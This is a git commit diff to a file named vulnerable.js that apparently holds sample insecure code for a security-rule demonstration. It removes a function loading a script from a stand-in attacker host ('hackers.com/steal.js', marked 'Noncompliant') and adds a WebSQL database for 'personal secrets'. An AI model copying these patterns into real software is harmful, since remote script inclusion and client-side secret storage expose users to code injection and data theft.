d1e4d05374c4ff93bddc5f29caa9d1614df9b8a1
J.P. Weiser <jpweiser@users.noreply.github.com>
2020-02-11 07:26:17 -0600

    Update vulnerable.js

--- public/vulnerable.js
+++ public/vulnerable.js
@@ -1,7 +1,1 @@
-function include(url) {
-  var s = document.createElement("script");
-  s.setAttribute("type", "text/javascript");
-  s.setAttribute("src", url);
-  document.body.appendChild(s);
-}
-include("http://hackers.com/steal.js")  // Noncompliant
+var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024); 
